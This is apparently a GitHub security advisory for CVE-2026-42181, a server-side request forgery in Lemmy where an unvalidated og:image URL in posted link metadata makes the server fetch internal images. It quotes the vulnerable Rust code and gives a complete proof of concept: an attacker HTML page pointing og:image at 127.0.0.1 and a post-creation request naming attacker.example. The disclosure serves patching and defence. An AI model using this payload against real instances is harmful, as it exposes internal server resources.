# [M] Lemmy has SSRF and internal image disclosure in post link metadata via unvalidated og:image

## Summary
Severity: Medium
Advisory: GHSA-h6hf-9846-xwrq
CVE: CVE-2026-42181
CWE: CWE-918
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-h6hf-9846-xwrq
Type: github-advisory

## Affected
- crates.io: `lemmy_api_common` — affected >=0 <0.19.18

## Details
### Summary
Lemmy fetches metadata for user-supplied post URLs and, under the default `StoreLinkPreviews` image mode, downloads the preview image through local pict-rs. While the top-level page URL is checked against internal IP ranges, the extracted `og:image` URL is not subject to the same restriction.

As a result, an authenticated low-privileged user can submit an attacker-controlled public page whose Open Graph image points to an internal image endpoint. Lemmy will fetch that internal image server-side and store a local thumbnail that can then be served back to users.

### Details
The metadata fetch logic applies an internal-address check only to the initial post URL. After HTML parsing, `extract_opengraph_data()` accepts absolute `og:image` values and returns them as-is. Later, `generate_post_link_metadata()` passes that second-hop image URL into `generate_pictrs_thumbnail()`, which instructs local pict-rs to fetch it through `image/download?url=...`.

This creates a two-stage source-to-sink chain where the first URL is constrained, but the security boundary is bypassed through an unvalidated secondary resource.

Core vulnerable code path:

```rust
// crates/api_common/src/request.rs
let metadata = match &post.url {
  Some(url) => fetch_link_metadata(url, &context, false).await.unwrap_or_default(),
  _ => Default::default(),
};
```

```rust
// crates/api_common/src/request.rs
let og_image = page
  .opengraph
  .images
  .first()
  .and_then(|ogo| url.join(&ogo.url).ok());
```

```rust
// crates/api_common/src/request.rs
let thumbnail_url = if let (true, Some(url)) = (allow_generate_thumbnail, image_url.clone()) {
  generate_pictrs_thumbnail(&url, &context).await.ok().map(Into::into).or(image_url)
} else {
  image_url.clone()
};
```

```rust
// crates/api_common/src/request.rs
let fetch_url = format!(
  "{}image/download?url={}&resize={}",
  pictrs_config.url,
  encode(image_url.as_str()),
  context.settings().pictrs_config()?.max_thumbnail_size
);
```

These snippets show that only the outer page URL is checked, while the extracted `og:image` value becomes a server-side fetch target without an equivalent internal-address guard.

### PoC
Prerequisites:

- The attacker has a valid low-privileged account.
- The instance uses the default link preview storage mode.
- The attacker can post a link to a community they can access.

Practical reproduction flow:

1. Host a public HTML page under attacker control.
2. Add an Open Graph image tag whose value points to an internal image URL reachable from the Lemmy host, such as `http://127.0.0.1:8081/internal.png`.
3. Create a Lemmy post whose `url` is the attacker-controlled page.
4. Observe Lemmy fetch the public page, extract `og:image`, and then fetch the internal image through pict-rs.
5. Observe the created post receive a local thumbnail URL, demonstrating that the internal image was retrieved and cached.

Complete PoC attacker page:

```html
<html><head>
<meta property="og:image" content="http://127.0.0.1:8081/internal.png">
</head><body>x</body></html>
```

Complete PoC request:

```http
POST /api/v3/post HTTP/1.1
Host: victim.example
Authorization: Bearer <low-priv-jwt>
Content-Type: application/json

{
  "name": "thumb-ssrf",
  "community_id": 1,
  "url": "https://attacker.example/og.html",
  "body": null,
  "alt_text": null,
  "honeypot": null,
  "nsfw": false,
  "language_id": null,
  "custom_thumbnail": null
}
```

Outcome:

- The post creation request succeeds.
- The internal image endpoint receives a request from the Lemmy server.
- The created post is updated with a local `thumbnail_url`, indicating that the internal image was fetched and cached.

### Impact
This issue upgrades an attacker-controlled external page into an internal image fetch primitive. It can be used to retrieve internal image resources, expose content that is otherwise reachable only from the application host, and publish those internal resources through Lemmy's own thumbnail serving path.

Because the vulnerable mode is the documented default behavior for link previews, the issue is relevant even without non-default privacy settings.

## References
- https://github.com/LemmyNet/lemmy/security/advisories/GHSA-h6hf-9846-xwrq
- https://nvd.nist.gov/vuln/detail/CVE-2026-42181
- https://github.com/LemmyNet/lemmy/commit/9ffe586dafac1a46acf17edf90e0165e5503b2f1
- https://github.com/LemmyNet/lemmy
- https://github.com/LemmyNet/lemmy/releases/tag/0.19.18
- https://join-lemmy.org/news/2026-04-20_-_Lemmy_Release_v0.19.18
